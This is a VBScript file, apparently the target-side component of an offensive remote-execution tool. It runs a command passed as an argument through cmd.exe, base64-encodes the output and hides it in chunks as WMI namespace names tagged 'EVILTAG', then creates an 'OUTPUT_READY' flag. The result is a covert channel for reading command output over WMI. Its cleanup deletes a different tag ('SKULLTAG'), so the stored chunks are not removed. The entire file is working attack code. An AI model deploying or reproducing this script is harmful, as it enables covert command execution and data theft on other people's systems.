Function encode(byVal strIn)
    Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    Dim w1, w2, w3, i, totalLen, strOut
    totalLen = Len(strIn)
    If Not ((totalLen Mod 3) = 0) Then totalLen = totalLen + 3 - (totalLen Mod 3)
    For i = 1 To totalLen Step 3
        w1 = prepare( Mid( strIn, i, 1 ) )
        w2 = prepare( Mid( strIn, i + 1, 1 ) )
        w3 = prepare( Mid( strIn, i + 2, 1 ) )
        strOut = strOut + Mid( Base64Chars, ( Int( w1 / 4 ) And 63 ) + 1 , 1 )
        strOut = strOut + Mid( Base64Chars, ( ( w1 * 16 + Int( w2 / 16 ) ) And 63 ) + 1, 1 )
	If (w2 Or w3) Then
	    strOut = strOut + Mid( Base64Chars, ( ( w2 * 4 + Int( w3 / 64 ) ) And 63 ) + 1, 1 )
	    If w3 Then
		strOut = strOut + Mid( Base64Chars, (w3 And 63 ) + 1, 1)
	    End If
	End If
    Next
    encode = strOut
End Function
Function prepare( byVal strIn )
    If Len( strIn ) = 0 Then
        prepare = 0 : Exit Function
    Else
        prepare = Asc(strIn)
    End If
End Function
Function parseCmdOutput(cmdOutput)
	strLen = Len(cmdOutput)
	pieceLen = 5500
	nbOfPieces = Int(strLen/pieceLen)
	For i = 1 to nbOfPieces
		piece = Left(cmdOutput,pieceLen)
		piece = "        " + piece + "        "
		cmdOutput = Mid(cmdOutput,pieceLen+1)
		insertPiece i,piece
	Next
	cmdOutput = "        " + cmdOutput + "        "
	insertPiece nbOfPieces+1,cmdOutput		
End Function
Function insertPiece(ByVal number,ByVal piece)
	count = CStr(number)
	zeros = String(6 - Len(count), "0")
	tag = "EVILTAG" + zeros + count
	piece = encode(piece)
	piece = Replace(piece,"+","Ó")
	piece = Replace(piece,"/","_")
	piece = tag + piece	
	Set aShell = CreateObject("WScript.Shell")
	aShell.Exec("wmic /NAMESPACE:\\root\default PATH __Namespace CREATE Name='" + piece + "'")
        WScript.Sleep 50
End Function
Set myShell = CreateObject("WScript.Shell")
tmpDir = myShell.ExpandEnvironmentStrings("%TEMP%")
Select Case WScript.Arguments.Item(0)
    Case "exit"
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like 'OUTPUT_READY'"" delete")
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like '%SKULLTAG%'"" delete")
    Case Else
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like 'OUTPUT_READY'"" delete")
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like '%SKULLTAG%'"" delete")
	set cmdExecution = myShell.exec("%comspec% /c " + WScript.Arguments.Item(0)) 
	cmdOutput = cmdExecution.StdOut.ReadAll 
	parseCmdOutput cmdOutput 
	myShell.Exec("wmic /NAMESPACE:\\root\default PATH __Namespace CREATE Name='OUTPUT_READY'")
End Select
